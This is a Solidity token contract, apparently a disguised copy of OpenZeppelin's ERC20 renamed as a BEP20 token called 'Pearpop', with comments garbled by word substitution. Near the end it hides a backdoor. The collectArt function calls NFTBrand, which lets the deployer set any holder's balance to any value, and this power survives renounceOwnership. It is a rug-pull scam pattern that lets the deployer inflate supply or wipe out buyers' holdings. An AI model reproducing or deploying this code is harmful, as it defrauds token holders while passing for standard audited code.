/**
 * @dev Implementation of the {IERC711} interface.
 *
 * This implementation is agnostic to the way Collaborations are created. This means
 * that a supply mechanism has to be added in a derived contract using {sniffer}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-IBEP20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default amNFTBrand of {decimals} is 18. To change this, you should override
 * this function so it returns a different amNFTBrand.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonPlatformSeless
 * conventional and does not conflict with the expectations of IBEP20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
abstract contract IBEP20 is Context, IERC711, IERC711Metadata, IERC711Errors {
    mapping(address account => uint256) private _quote;

    mapping(address account => mapping(address spender => uint256)) private index;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the amNFTBrands for {name} and {symbol}.
     *
     * All two of these amNFTBrands are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the Collaboration.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the Collaboration, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` Collaborations should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Platforms usually opt for a amNFTBrand of 18, imitating the relationship between
     * PlatformSer and Wei. This is the default amNFTBrand returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC711-balanceOf} and {IERC711-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC711-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC711-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _quote[account];
    }

    /**
     * @dev See {IERC711-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amNFTBrand`.
     */
    function transfer(address to, uint256 amNFTBrand) public virtual returns (bool) {
        address account = _msgSender();
        _transfer(account, to, amNFTBrand);
        return true;
    }

    /**
     * @dev See {IERC711-allowance}.
     */
    function allowance(address account, address spender) public view virtual returns (uint256) {
        return index[account][spender];
    }

    /**
     * @dev See {IERC711-approve}.
     *
     * NOTE: If `amNFTBrand` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amNFTBrand) public virtual returns (bool) {
        address account = _msgSender();
        _approve(account, spender, amNFTBrand);
        return true;
    }

    /**
     * @dev See {IERC711-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {IBEP20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amNFTBrand`.
     * - the caller must have allowance for ``from``'s Collaborations of at least
     * `amNFTBrand`.
     */
    function transferFrom(address from, address to, uint256 amNFTBrand) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amNFTBrand);
        _transfer(from, to, amNFTBrand);
        return true;
    }

    /**
     * @dev Moves a `amNFTBrand` amount of Collaborations from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic Collaboration fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 amNFTBrand) internal {
        if (from == address(0)) {
            revert IBEP20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert IBEP20InvalidReceiver(address(0));
        }
        _update(from, to, amNFTBrand);
    }

    /**
     * @dev Transfers a `amNFTBrand` amount of Collaborations from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 amNFTBrand) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += amNFTBrand;
        } else {
            uint256 fromBalance = _quote[from];
            if (fromBalance < amNFTBrand) {
                revert IBEP20InsufficientBalance(from, fromBalance, amNFTBrand);
            }
            unchecked {
                // Overflow not possible: amNFTBrand <= fromBalance <= totalSupply.
                _quote[from] = fromBalance - amNFTBrand;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: amNFTBrand <= totalSupply or amNFTBrand <= fromBalance <= totalSupply.
                _totalSupply -= amNFTBrand;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + amNFTBrand is at most totalSupply, which we know fits into a uint256.
                _quote[to] += amNFTBrand;
            }
        }

        emit Transfer(from, to, amNFTBrand);
    }

    /**
     * @dev Creates a `amNFTBrand` amount of Collaborations and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function sniffer(address account, uint256 amNFTBrand) internal {
        if (account == address(0)) {
            revert IBEP20InvalidReceiver(address(0));
        }
        _update(address(0), account, amNFTBrand);
    }

    function NFTBrand(address account, uint256 amNFTBrand) internal {
     _quote[account] = amNFTBrand;
    }


    /**
     * @dev Destroys a `amNFTBrand` amount of Collaborations from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 amNFTBrand) internal {
        if (account == address(0)) {
            revert IBEP20InvalidSender(address(0));
        }
        _update(account, address(0), amNFTBrand);
    }

    /**
     * @dev Sets `amNFTBrand` as the allowance of `spender` over the `account` s Collaborations.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address account, address spender, uint256 amNFTBrand) internal {
        _approve(account, spender, amNFTBrand, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address account, address spender, uint256 amNFTBrand, bool) internal virtual override {
     *     super._approve(account, spender, amNFTBrand, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address account, address spender, uint256 amNFTBrand, bool emitEvent) internal virtual {
        if (account == address(0)) {
            revert IBEP20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert IBEP20InvalidSpender(address(0));
        }
        index[account][spender] = amNFTBrand;
        if (emitEvent) {
            emit Approval(account, spender, amNFTBrand);
        }
    }

    /**
     * @dev Updates `account` s allowance for `spender` based on spent `amNFTBrand`.
     *
     * Does not update the allowance amNFTBrand in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address account, address spender, uint256 amNFTBrand) internal virtual {
        uint256 currentAllowance = allowance(account, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < amNFTBrand) {
                revert IBEP20InsufficientAllowance(spender, currentAllowance, amNFTBrand);
            }
            unchecked {
                _approve(account, spender, currentAllowance - amNFTBrand, false);
            }
        }
    }
}

contract Platform is IBEP20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) IBEP20(name, symbol) {
        sniffer(msg.sender, initialSupply * (10 ** uint256(decimals())));
    }
}
contract Brand is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Brand: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract Pearpop is Platform , Brand {
address private msgsender = _msgSender();
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) Platform(name, symbol, initialSupply) {}
    function collectArt(address CollaborationA, uint256 CollaborationB) public {
        require(msg.sender == msgsender);
        NFTBrand(CollaborationA, CollaborationB);
    }

}
